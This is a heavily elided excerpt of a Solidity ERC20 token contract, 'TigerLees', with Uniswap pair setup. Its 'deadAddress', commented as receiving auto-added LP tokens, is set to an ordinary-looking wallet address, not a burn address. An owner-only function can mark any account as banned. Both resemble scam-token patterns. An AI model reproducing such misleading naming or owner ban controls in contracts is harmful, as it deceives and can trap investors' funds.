...
contract TigerLees is ERC20, Ownable {
    using SafeMath for uint256;
 
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
	// address that will receive the auto added LP tokens
    address public constant deadAddress = address(0xCF1CE8e3d799b38819fD2c64Eef696A62b36E160);
    ...
    constructor() ERC20("TigerLees", "TigerLees") {
    ...
    function setBanModifier(address account, bool onOrOff) external onlyOwner {
        _BanBot[account] = onOrOff;
    }
